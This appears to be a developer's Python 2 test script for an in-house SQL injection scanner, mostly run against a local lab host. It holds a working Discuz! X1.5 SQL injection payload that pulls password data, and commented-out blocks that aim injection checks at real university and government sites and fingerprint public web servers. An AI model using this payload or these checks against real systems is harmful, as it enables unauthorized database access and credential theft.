# -*- coding: utf-8 -*-
import sys
import json
import httplib2
from engine_utils.InjectUrlLib import *
from logger import scanLogger as logger
from engine_utils.DictData import headerDictDefault
from engine_utils.yd_http import request
from engine_utils.common import getResponse
from engine_utils.InjectSql import InjectSql
from engine_utils.InjectUrlLib import parseCurlCommand
from engine_utils.params import query2dict, db_params2dict, post_all_query2dict

curlCommand = '''curl 'http://discuzx15.target.safety.local.com/misc.php?mod=stat&op=trend&xml=1&merge=3&types[1]=password`as%20statistic%20from%20pre_common_statuser,pre_ucenter_members%20as' -H 'Host: discuzx15.target.safety.local.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Cookie: 9nII_2132_auth=6feeYFaU%2BSWWYrimX3WmHxLJQ2WhAvGunJvEBYo%2FkWYHQQP3FryzAeMSfIwhsFXfOQxG4CaV%2BZLQElcFuBKo; 9nII_2132_lastvisit=1481611136; 9nII_2132_sid=mezr7J; 9nII_2132_lastact=1481619249%09misc.php%09stat; 9nII_2132_ulastactivity=89efLVoBzc8xPIxF5rUhm4QMBgm4ntoFzNQ9J8t2G2XjDNrEOFqE' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0'
''';
result = parseCurlCommand(curlCommand)
#print result
#headers = headerDictDefault
headers = result['headers']
print headers
headers['cookie'] = result['cookie']
response = request(url=result['url'], headers=headers)
#print response['response_body']
sys.exit(1)

'''
bodyStr = '[{"type":"submit","name":"seclev_submit","value":"Submit"},{"type":"select","name":"security","value":"low"}]'
bodyStr = ''
bodyDict = db_params2dict(bodyStr)
print bodyDict
sys.exit(1)
'''

'''
#url = "http://www.lsu.edu.cn/_web/search/doSearch.do?_p=YXM9NCZ0PTUmZD04NCZwPTEmbT1TTiY_"
url = "http://www.lsu.edu.cn/_web/search/doSearch.do"
print post_all_query2dict(url)
sys.exit(1)
'''

'''
url = "http://www.fzipo.gov.cn/WholeSiteSearch/WholeSiteSearch_AllList.aspx"
queryDict = {"keyword":"d", "id":"9"}
injectSql = InjectSql()
#print injectSql.injectError(url=url, queryDict=queryDict, theKey="keyword")
print injectSql.checkFirstForGet(url=url, queryDict=queryDict, theKey="keyword")
'''

'''
url = "http://target.safety.local.com:8504/sqli_mysql_error.php"
queryDict = {"id":"9","a":"b","c":"d"}
injectSql = InjectSql()
print injectSql.injectErrorForInt(url=url, queryDict=queryDict, theKey="id")
'''

'''
url = "http://target.safety.local.com:8504/sqli_mysql_error.php"
queryDict = {"id":"1","a":"b","c":"d"}
bodyDict = {}
headers = {"cookie":"PHPSESSID=xxxxxxxx", "Content-Type":"application/x-www-form-urlencoded"}
injectSql = InjectSql()
print injectSql.checkFirstForGet(url=url, queryDict=queryDict, bodyDict=bodyDict, headers=headers, theKey="id", method="GET")
'''

'''
url = "http://target.safety.local.com:8504/sqli_mysql_error_header.php"
injectSql = InjectSql()
list = injectSql.checkFirstForHeader(url=url)
print list
print json.dumps(list[0])
'''

'''
url = "http://target.safety.local.com:8504/sqli_mysql_error.php"
queryDict = {"id":"1"}
injectSql = InjectSql()
print injectSql.checkFirstForCookie(url=url, queryDict=queryDict, theKey="id")
'''

url = "http://target.safety.local.com:8504/sqli_mysql_error.php"
query = 'ac=ab'
bodyStr = '[{"type":"submit","name":"create_db","value":"Create/ResetDatabase"},{"type":"hidden","name":"id","value":"1"}]'
headers = {"cookie":"PHPSESSID=xxxxxxxx", "Content-Type":"application/x-www-form-urlencoded"}
queryDict = query2dict(query)
bodyDict = db_params2dict(bodyStr)
injectSql = InjectSql()
result = injectSql.checkFirstForGet(url=url, queryDict=queryDict, bodyDict=bodyDict, headers=headers, theKey="id", method="POST")
print type(result), json.dumps(result)

'''
urls = [
    "http://www.lmwlove.com/",
    "http://www.ifeng.com",
    "http://www.yundun.com",
    "http://www.discuz.net/forum.php",
    "http://www.baidu.com",
    "http://v.hao123.com/",
    "http://ai.taobao.com/?pid=mm_43125636_4246598_14412500",
    "http://www.autohome.com.cn/",
    "http://www.xinhuanet.com/",
    "http://www.iqiyi.com/",
    "http://www.163.com/",
    "http://www.qq.com/",
    "http://tuijian.hao123.com/",
    "http://cn.misumi-ec.com/lps/dspreg/dd/?utm_source=hao123",
    "http://zaozuo.com/?zfrom=daohang_hao123&utm_source=hao123&utm_medium=daohang",
    "http://hao123.hm-dental.com/zt/eye/",
    "http://www.kowa-dental.com/topic/hbzzy/?hao123-PC-ZZYcnxh-zhongzhiyayiyuan",
    "http://hao123.hm-dental.com/zt/bns/",
    "https://www.nuomi.com/",
    "http://www.4399.com/",
    "http://www.7k7k.com/",
    "http://www.gamersky.com/",
]
for url in urls:
    response = request(url=url)
    if response['response_headers'].has_key('server'):
        print url, response['response_headers']['server']
    sys.exit(1)
'''

